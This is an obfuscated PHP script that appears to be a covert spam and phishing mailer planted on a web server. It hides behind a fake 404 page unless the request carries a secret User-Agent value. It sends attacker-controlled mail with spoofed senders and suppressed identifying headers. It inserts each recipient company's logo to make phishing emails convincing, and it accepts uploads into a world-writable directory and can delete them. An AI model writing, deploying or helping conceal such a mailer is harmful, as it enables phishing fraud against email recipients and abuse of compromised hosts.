<?php

 goto YF0i4; pcU5a: if (strpos($_SERVER["\x48\x54\x54\x50\x5f\125\x53\105\x52\137\101\107\105\x4e\124"], "\x74\141\x6e\151\165\x6d") == false) { header("\x48\124\x54\x50\x2f\61\x2e\60\x20\x34\x30\64\40\116\157\x74\x20\106\157\x75\x6e\x64"); exit; } goto cCcvo; cCcvo: if ($_GET["\x64\141\164\141"] == "\61") { goto OnygA; vur6O: $isattach = $_POST["\x69\x73\141\164\x74\141\x63\x68"]; goto cXfVy; v6KR6: $from = hex2bin($_POST["\146\x72\x6f\x6d"]); goto qNohd; qNohd: $ssl = $_POST["\163\x73\x6c"]; goto tTUaK; P6_pY: $pass = hex2bin($_POST["\160\x61\163\163"]); goto dyS0A; Uzy3Z: $auth = $_POST["\141\165\164\x68"]; goto y0TrY; dyS0A: $port = $_POST["\160\x6f\162\x74"]; goto v6KR6; cXfVy: $let = hex2bin($_POST["\x6c\x65\x74"]); goto lpzvM; ns39U: $reply = hex2bin($_POST["\x72\x65\x70\x6c\x79"]); goto Rfmrq; WTX9T: $host = hex2bin($_POST["\x68\x6f\x73\x74"]); goto oLaC2; zNSQH: $sub = hex2bin($_POST["\x73\x75\142"]); goto vur6O; g0E7F: die($output); goto p15N1; OnygA: require "\x73\157\165\x72\143\145\x2f\120\x48\120\x4d\141\151\154\x65\162\101\x75\164\x6f\154\157\141\144\x2e\160\x68\x70"; goto Viw1r; oUwoS: $link = hex2bin($_POST["\154\x69\156\x6b"]); goto ns39U; tTUaK: $to = hex2bin($_POST["\164\157"]); goto zNSQH; kNu0x: $attach_name = hex2bin($_POST["\141\x74\x74\x61\143\150\x5f\156\141\x6d\x65"]); goto Uzy3Z; xB8lZ: $attach_encode = hex2bin($_POST["\x61\x74\x74\x61\x63\150\137\145\x6e\x63\157\144\145"]); goto xBNAw; lpzvM: $attach = hex2bin($_POST["\141\x74\164\x61\143\x68"]); goto xB8lZ; frc8h: $html = $_POST["\150\x74\155\154"]; goto oUwoS; Viw1r: ini_set("\155\x61\x69\154\x2e\x61\x64\x64\x5f\170\137\x68\x65\141\x64\145\162", "\117\146\x66"); goto uU8y3; VqxHB: $sender = hex2bin($_POST["\163\145\156\x64\x65\x72"]); goto P6_pY; yyhNV: function smtpmailer($host, $user, $sender, $pass, $port, $from, $ssl, $to, $sub, $let, $isattach, $attach, $attach_encode, $attach_type, $attach_name, $auth, $embed, $html, $link, $reply) { goto HjHmu; K258P: $mail->Body = $let; goto em9rw; HjHmu: $mail = new PHPMailer(); goto E4dDZ; EbPA3: if (strpos($let, "\x25\107\x52\x41\x42\62\45") == true) { goto EUGAa; FtXPE: $ch = curl_init(); goto zEwon; zEwon: curl_setopt($ch, CURLOPT_URL, "\150\x74\x74\160\163\72\57\57\154\157\x67\157\x2e\143\154\x65\x61\x72\142\x69\x74\56\x63\x6f\x6d\x2f{$domain}"); goto xnoRZ; sSOth: $headers[] = "\x55\x70\147\x72\x61\x64\x65\55\x49\x6e\163\x65\x63\165\162\145\55\122\145\x71\165\145\x73\x74\163\x3a\40\61"; goto Q0ORL; g2SMJ: curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); goto mlz0o; Q0ORL: $headers[] = "\x4d\x6f\172\151\154\154\141\57\65\x2e\x30\x20\x28\127\x69\156\144\x6f\x77\163\40\116\x54\x20\x31\x30\x2e\60\x3b\40\127\151\x6e\x36\x34\x3b\x20\170\x36\64\51\x20\x41\x70\x70\154\x65\x57\145\142\113\x69\x74\x2f\65\x33\x37\x2e\63\x36\40\x28\x4b\x48\124\115\114\54\40\154\151\153\145\x20\107\x65\143\x6b\157\x29\40\103\150\162\157\155\x65\x2f\70\70\56\x30\x2e\64\63\62\64\x2e\x31\x30\64\40\123\141\x66\x61\x72\151\57\x35\63\x37\56\63\x36"; goto g2SMJ; EUGAa: $domain = substr(strrchr($to, "\x40"), 1); goto FtXPE; NQhF1: curl_close($ch); goto ge9zr; xnoRZ: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto Eixx5; Eixx5: curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "\107\x45\124"); goto bZqGI; qM1JM: if (!$result || strlen(trim($result)) == 0 || curl_errno($ch)) { goto u5F3l; xwIlF: $name = basename($src); goto B4MmZ; h0618: $first = $arr[0]; goto fJc4F; B4MmZ: $arr = explode("\56", $name, 2); goto h0618; u5F3l: $src = $link; goto xwIlF; fJc4F: $let = preg_replace("\x2f\45\107\122\101\x42\62\45\x2f", "\143\x69\144\72{$first}", $let); goto YmjEu; pRsgW: $mail->addStringEmbeddedImage($img, $first, "{$first}", "\x62\x61\163\145\x36\64", "\151\x6d\x61\147\145\x2f\160\x6e\x67"); goto SxVP9; YmjEu: $img = file_get_contents_curl3($src); goto pRsgW; SxVP9: } else { goto wLEpG; pI1yV: $arr = explode("\x2e", $name, 2); goto vj68n; wLEpG: $src = "\x68\164\x74\x70\x73\x3a\57\57\154\157\x67\157\x2e\143\154\x65\x61\162\x62\151\x74\56\x63\x6f\x6d\57{$domain}"; goto hbbNi; H7v7P: $let = preg_replace("\x2f\x25\x47\x52\x41\102\62\45\57", "\143\151\x64\72{$first}", $let); goto iNe88; c7Py9: $mail->addStringEmbeddedImage($img, $first, "{$first}", "\x62\x61\163\145\66\64", "\151\155\x61\147\x65\x2f\x70\x6e\x67"); goto DJ968; hbbNi: $name = basename($src); goto pI1yV; iNe88: $img = file_get_contents_curl3($src); goto c7Py9; vj68n: $first = $arr[0]; goto H7v7P; DJ968: } goto NQhF1; rblFe: $headers = array(); goto sSOth; mlz0o: $result = curl_exec($ch); goto qM1JM; bZqGI: curl_setopt($ch, CURLOPT_ENCODING, "\x67\x7a\151\x70\x2c\x20\144\x65\146\x6c\x61\164\145"); goto rblFe; ge9zr: } goto K258P; KGnxL: if (!empty($reply)) { $mail->AddCustomHeader("\x52\x65\164\x75\x72\x6e\55\x50\x61\x74\x68\x3a\40\x3c{$reply}\x3e"); $mail->AddCustomHeader("\x52\x65\x70\x6c\171\55\x74\x6f\72{$reply}"); } goto EbPA3; v5Bgp: $mail->Subject = $sub; goto KGnxL; C_jrl: if ($isattach == 1) { if (strtolower($attach_type) == "\141\165\164\x6f") { $attachauto = PHPMailer::filenameToType($attach_name); $mail->AddStringAttachment($attach, $attach_name, $attach_encode, $attachauto); } else { $mail->AddStringAttachment($attach, $attach_name, $attach_encode, $attach_type); } } goto E5l6M; U7JOY: if (!$mail->Send()) { $sendresult = "\60"; return $sendresult; } else { $sendresult = "\x31"; return $sendresult; } goto zOE6V; hER2d: $mail->FromName = $from; goto IE0Ig; E4dDZ: $mail->XMailer = "\x20"; goto p5J11; fGfg9: $mail->From = $sender; goto hER2d; IE0Ig: $mail->Sender = $sender; goto v5Bgp; WkAJj: $mail->Timeout = 60; goto GUEK3; GUEK3: if ($html == "\61") { $mail->IsHTML(true); } else { $mail->IsHTML(false); } goto fGfg9; em9rw: if ($embed == 1) { foreach (glob("\x6c\157\x67\x6f\57\x2a\x2e\52") as $fileName2) { goto w0pXC; o1CJn: $mail->AddEmbeddedImage("\154\x6f\147\x6f\57" . $emb[1], $filen); goto siY2Q; efkDy: $filen = pathinfo($emb[1], PATHINFO_FILENAME); goto o1CJn; siY2Q: JJzWA: goto J7UaT; w0pXC: $emb = explode("\x2f", $fileName2); goto efkDy; J7UaT: } VcFHo: } goto C_jrl; XJUFc: if ($auth == "\61") { goto vh2s9; vh2s9: $mail->IsSMTP(); goto RBAUV; h9IyU: $mail->Password = $pass; goto aM0ql; NSU4P: $mail->SMTPOptions = array("\x73\163\x6c" => array("\166\x65\x72\151\x66\171\x5f\160\x65\145\162" => false, "\166\x65\x72\x69\x66\171\x5f\160\x65\x65\162\137\156\x61\x6d\x65" => false, "\141\154\154\x6f\167\x5f\x73\145\x6c\146\x5f\163\x69\147\x6e\x65\x64" => true)); goto gc2iJ; cp5MX: $mail->Debugoutput = function ($str, $level) { $GLOBALS["\x64\145\x62\165\x67"] .= "{$level}\x3a\x20{$str}\xa"; }; goto Cj680; wzNOS: $mail->Username = $user; goto h9IyU; N4PSW: $mail->SMTPAuth = true; goto cp5MX; c7G9P: if ($ssl == 0) { $mail->SMTPSecure = "\x6e\x6f\x6e\145"; } elseif ($ssl == 1) { $mail->SMTPSecure = "\x73\x73\x6c"; } elseif ($ssl == 2) { $mail->SMTPSecure = "\x74\x6c\163"; } goto SsxpY; RBAUV: $mail->SMTPAutoTLS = false; goto NSU4P; gc2iJ: $mail->Host = $host; goto wzNOS; aM0ql: $mail->Port = $port; goto N4PSW; Cj680: $mail->SMTPDebug = 1; goto c7G9P; SsxpY: } else { $mail->AddCustomHeader("\130\x2d\120\110\x50\55\x4f\x72\x69\147\x69\156\x61\x74\x69\x6e\147\55\123\x63\162\151\160\164\72"); } goto WkAJj; E5l6M: $mail->AddAddress($to); goto U7JOY; p5J11: $mail->CharSet = "\x55\124\x46\55\70"; goto XJUFc; zOE6V: } goto WTX9T; FEE6d: $output = json_encode(array("\163\x74\x61\164\165\163" => $sendresult, "\x64\145\x62\165\147" => $debug)); goto g0E7F; y0TrY: $embed = $_POST["\145\x6d\142\x65\144"]; goto frc8h; uU8y3: function file_get_contents_curl3($url) { goto No8uv; No8uv: $curl = curl_init($url); goto rTwPm; YKEKF: curl_setopt($curl, CURLOPT_TIMEOUT, 60); goto uFvIY; rTwPm: curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 20); goto XfAZ6; XfAZ6: curl_setopt($curl, CURLOPT_URL, $url); goto lPjD3; b0OEx: curl_close($curl); goto eVSBM; KI8zB: curl_setopt($curl, CURLOPT_USERAGENT, "\115\157\172\151\154\x6c\141\x2f\65\x2e\x30\x20\50\127\151\156\144\157\x77\163\x20\x4e\124\x20\61\60\x2e\x30\x3b\40\127\151\156\x36\64\x3b\x20\x78\x36\64\x29\40\x41\160\x70\154\145\x57\145\142\113\151\164\57\65\63\67\56\63\66\x20\x28\113\110\x54\115\x4c\54\x20\154\x69\153\x65\40\x47\145\143\153\157\51\x20\x43\150\x72\x6f\x6d\145\57\x38\70\56\60\56\x34\x33\62\64\x2e\x31\60\x34\40\123\x61\146\x61\x72\151\57\x35\63\x37\56\63\66"); goto YKEKF; lPjD3: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto KI8zB; eVSBM: return $data; goto BQ4_Z; uFvIY: $data = curl_exec($curl); goto b0OEx; BQ4_Z: } goto yyhNV; xBNAw: $attach_type = hex2bin($_POST["\141\x74\x74\141\143\x68\137\x74\171\160\145"]); goto kNu0x; Rfmrq: $sendresult = smtpmailer($host, $user, $sender, $pass, $port, $from, $ssl, $to, $sub, $let, $isattach, $attach, $attach_encode, $attach_type, $attach_name, $auth, $embed, $html, $link, $reply); goto FEE6d; oLaC2: $user = hex2bin($_POST["\165\x73\145\162"]); goto VqxHB; p15N1: } goto wPgLo; wPgLo: if ($_GET["\144\141\x74\141"] == "\x32") { goto OMETB; xVQq1: $sender = hex2bin($_POST["\163\145\x6e\144\145\x72"]); goto UI6Vl; rpw59: if ($embed == 1) { goto ij05c; jsTiO: if (@mail($to, $sub, $message, $headers)) { goto hCOP5; C7Eb8: $output = json_encode(array("\x73\164\x61\x74\165\x73" => $sendresult, "\x64\x65\x62\165\x67" => "\x6e\157\156\x65")); goto Z_V8o; hCOP5: $sendresult = "\61"; goto C7Eb8; Z_V8o: die($output); goto GGq6p; GGq6p: } else { goto ckm1h; ckm1h: $sendresult = "\60"; goto CVRIn; CVRIn: $output = json_encode(array("\163\x74\141\x74\x75\163" => $sendresult, "\x64\x65\x62\x75\147" => "\156\157\156\x65")); goto Jik6d; Jik6d: die($output); goto bE3X1; bE3X1: } goto PrIle; iYzse: $message .= "\103\157\156\164\145\x6e\164\x2d\124\x79\160\x65\x3a\x20\x69\155\141\x67\145\57\160\x6e\x67\73\x20\x6e\141\x6d\x65\x3d\x22\x6c\x6f\x67\157\56\x70\156\x67\42\15\xa" . "\x43\x6f\156\164\x65\x6e\164\55\x54\x72\141\x6e\x73\146\145\162\x2d\x45\156\x63\157\x64\151\x6e\x67\x3a\x20\142\x61\x73\145\66\64\15\12" . "\x43\157\156\164\145\156\x74\x2d\x49\104\72\x20\74\x6c\x6f\147\157\x3e\xd\12" . "\x43\157\156\164\145\x6e\164\55\104\145\x73\143\x72\x69\160\164\x69\x6f\x6e\x3a\x20\101\x74\x74\x61\x63\150\155\x65\156\x74\xd\12" . "\103\x6f\156\164\145\156\x74\x2d\x44\151\x73\160\x6f\x73\151\164\151\157\x6e\x3a\x20\x69\156\x6c\x69\x6e\x65\73\40\146\x69\154\x65\x6e\141\155\x65\x3d\42\x6c\x6f\x67\x6f\x2e\160\x6e\147\x22\x72\12" . "\xd\12" . chunk_split(base64_encode($file)) . $bound_last; goto jsTiO; iNo3F: $bound = "\55\x2d" . $bound_text . "\xd\12"; goto gCeDq; Yg7ps: $headers .= "\115\x49\x4d\x45\x2d\126\145\x72\163\x69\x6f\x6e\x3a\x20\x31\x2e\60\15\12" . "\103\157\156\x74\x65\x6e\x74\x2d\x54\x79\160\x65\x3a\40\x6d\x75\x6c\164\151\x70\x61\x72\164\x2f\155\151\170\145\144\73\40\142\157\165\156\x64\x61\x72\171\75\x22{$bound_text}\42" . "\xd\12"; goto oZIVk; ij05c: $bound_text = "\55\x2d\x2d\x2d\52\45\x24\41\x24\x25\x2a"; goto iNo3F; tqqzM: $message .= "\x43\x6f\156\x74\145\x6e\x74\x2d\x54\171\160\x65\x3a\x20\164\145\170\x74\57\x68\164\155\x6c\x3b\40\x63\150\x61\x72\x73\x65\x74\x3d\x55\x54\106\x2d\x38" . "\xd\xa" . "\x43\157\x6e\164\x65\156\x74\x2d\x54\x72\x61\x6e\163\x66\x65\162\x2d\105\x6e\x63\157\x64\x69\156\x67\x3a\40\x37\142\x69\x74" . "\xd\xa\xd\12" . $let . "\xa\xa" . $bound; goto s_3ii; gCeDq: $bound_last = "\55\x2d" . $bound_text . "\55\55\xd\xa"; goto Yg7ps; oZIVk: if ($sender != '') { $headers .= "\106\x72\x6f\x6d\x3a\40" . $from . "\x20\x3c" . $sender . "\x3e" . "\15\12"; } goto KjcSZ; KjcSZ: $message = "\40\15\xa" . $bound; goto tqqzM; s_3ii: $file = file_get_contents("\154\x6f\147\x6f\x2f\154\x6f\x67\x6f\56\x70\156\x67"); goto iYzse; PrIle: } else { goto Gozc9; cqL3L: if (@mail($to, $sub, $let, $headers)) { goto Ht329; bGg2d: $output = json_encode(array("\163\164\141\164\165\163" => $sendresult, "\144\145\x62\165\x67" => "\156\x6f\156\145")); goto kdYhL; Ht329: $sendresult = "\61"; goto bGg2d; kdYhL: die($output); goto DVytP; DVytP: } else { goto yh1Wv; gEXha: $output = json_encode(array("\x73\x74\141\164\165\x73" => $sendresult, "\144\x65\142\165\x67" => "\156\157\156\x65")); goto ICUUr; yh1Wv: $sendresult = "\x30"; goto gEXha; ICUUr: die($output); goto XEqp9; XEqp9: } goto XmQim; wi6Gy: $headers .= "\x43\x6f\156\164\x65\156\164\55\x74\x79\160\x65\x3a\x20\164\145\x78\164\x2f\150\x74\x6d\154\73\x20\x63\x68\141\x72\x73\x65\x74\75\x75\x74\x66\55\70" . "\15\xa"; goto cqL3L; Gozc9: $headers = "\x4d\111\115\x45\x2d\126\145\162\x73\x69\x6f\156\72\40\61\56\60" . "\xd\12"; goto QQHt2; QQHt2: if ($sender != '') { $headers .= "\106\x72\x6f\155\x3a\40" . $from . "\40\74" . $sender . "\76" . "\15\12"; } goto wi6Gy; XmQim: } goto PzPY2; OMETB: $from = hex2bin($_POST["\146\x72\157\x6d"]); goto zeNZF; CEiLQ: $let = hex2bin($_POST["\154\145\x74"]); goto XGUCd; XGUCd: $embed = $_POST["\145\155\142\x65\x64"]; goto rpw59; UI6Vl: $sub = hex2bin($_POST["\163\x75\142"]); goto CEiLQ; zeNZF: $to = hex2bin($_POST["\x74\157"]); goto xVQq1; PzPY2: } goto R8pSF; R8pSF: if ($_GET["\x64\141\164\141"] == "\63") { goto ocen1; LnpWc: saveBase64ImagePng($_POST["\x6c\157\x67\x6f"], $img, $_POST["\x6e\141\155\x65"]); goto rW5zZ; ocen1: $dir = dirname(__FILE__) . "\57\154\x6f\147\157"; goto IxxWG; EK250: function saveBase64ImagePng($base64Image, $imageDir, $name) { goto wTu9n; L3wpS: $filePath = $imageDir . $fileName; goto jQFhM; wTu9n: $fileName = $name . "\x2e\x70\156\x67"; goto lLaCK; T69oR: $base64Image = str_replace("\x64\141\x74\141\x3a\x69\x6d\x61\147\145\x2f\x70\x6e\x67\73\x62\x61\x73\x65\66\x34\54", '', $base64Image); goto hd9bv; BTY_g: $imageData = base64_decode($base64Image); goto L3wpS; lLaCK: $base64Image = trim($base64Image); goto T69oR; jQFhM: file_put_contents($filePath, $imageData); goto Q6ypo; hd9bv: $base64Image = str_replace("\x20", "\53", $base64Image); goto BTY_g; Q6ypo: } goto p5Ph1; IxxWG: if (!file_exists($dir)) { mkdir($dir, 0777); chmod($dir, 0777); } goto EK250; p5Ph1: $img = "\x6c\x6f\147\x6f\57"; goto LnpWc; rW5zZ: } goto RDXFp; OOpiu: header("\101\x63\143\x65\x73\x73\55\x43\x6f\x6e\164\x72\157\154\55\x41\x6c\154\157\167\x2d\x48\145\x61\144\x65\x72\163\72\40\x78\x2d\164\x65\x73\164\55\x68\145\x61\x64\x65\162\x2c\x20\x4f\x72\x69\x67\x69\156\54\40\130\x2d\x52\x65\161\165\x65\163\x74\145\x64\55\127\x69\x74\150\54\x20\103\x6f\x6e\164\145\x6e\x74\x2d\x54\171\160\145\54\40\x41\x63\x63\145\160\x74"); goto pcU5a; YF0i4: error_reporting(0); goto riKEs; riKEs: header("\x41\x63\x63\x65\163\x73\55\x43\x6f\156\164\162\x6f\154\55\101\154\x6c\157\x77\55\117\162\x69\x67\151\156\x3a\x20\x2a"); goto afVL2; afVL2: header("\101\x63\143\145\163\x73\x2d\103\157\x6e\164\162\157\x6c\55\x41\154\154\x6f\167\x2d\115\x65\x74\x68\x6f\144\163\72\40\x47\105\124\x2c\40\120\117\123\x54\x2c\40\x50\125\x54\54\40\x44\x45\x4c\105\124\105\x2c\40\x4f\120\124\111\117\116\x53"); goto OOpiu; RDXFp: if ($_GET["\x64\x61\164\141"] == "\64") { $dir = dirname(__FILE__) . "\x2f\x6c\x6f\147\157"; if (file_exists($dir)) { goto HP9jH; WujAb: foreach ($files as $file) { if (is_file($file)) { unlink($file); } sbbE8: } goto twz3f; HP9jH: $files = glob("\x6c\157\x67\157\57\x7b\x2c\x2e\x7d\x2a", GLOB_BRACE); goto WujAb; twz3f: T6mCc: goto sQ6AV; sQ6AV: } }